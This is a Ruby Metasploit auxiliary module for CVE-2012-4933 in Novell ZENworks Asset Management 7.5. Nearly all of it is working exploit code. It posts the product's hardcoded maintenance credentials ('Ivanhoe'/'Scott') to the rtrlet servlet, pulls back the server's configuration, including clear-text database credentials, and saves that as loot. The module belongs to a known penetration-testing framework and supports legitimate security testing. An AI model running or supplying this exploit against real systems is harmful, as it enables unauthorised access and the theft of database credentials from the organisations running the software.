##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Novell ZENworks Asset Management 7.5 Configuration Access',
      'Description'    => %q{
          This module exploits a hardcoded user and password for the GetConfig maintenance
        task in Novell ZENworks Asset Management 7.5. The vulnerability exists in the Web
        Console and can be triggered by sending a specially crafted request to the rtrlet component,
        allowing a remote unauthenticated user to retrieve the configuration parameters of
        Novell Zenworks Asset Managment, including the database credentials in clear text.
        This module has been successfully tested on Novell ZENworks Asset Management 7.5.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'juan vazquez' # Also the discoverer
        ],
      'References'     =>
        [
          [ 'CVE', '2012-4933' ],
          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2012/10/11/cve-2012-4933-novell-zenworks' ]
        ]
    ))

    register_options(
      [
        Opt::RPORT(8080),
      ])
  end

  def run_host(ip)

    post_data = "kb=&file=&absolute=&maintenance=GetConfigInfo_password&username=Ivanhoe&password=Scott&send=Submit"

    print_status("#{rhost}:#{rport} - Sending request...")
    res = send_request_cgi({
      'uri'          => '/rtrlet/rtr',
      'method'       => 'POST',
      'data'         => post_data,
    }, 5)

    if res and res.code == 200 and res.body =~ /<b>Rtrlet Servlet Configuration Parameters \(live\)<\/b><br\/>/
      print_good("#{rhost}:#{rport} - File retrieved successfully!")
      path = store_loot(
        'novell.zenworks_asset_management.config',
        'text/html',
        ip,
        res.body,
        nil,
        "Novell ZENworks Asset Management Configuration"
      )
      print_status("#{rhost}:#{rport} - File saved in: #{path}")
    else
      print_error("#{rhost}:#{rport} - Failed to retrieve configuration")
      return
    end

  end
end
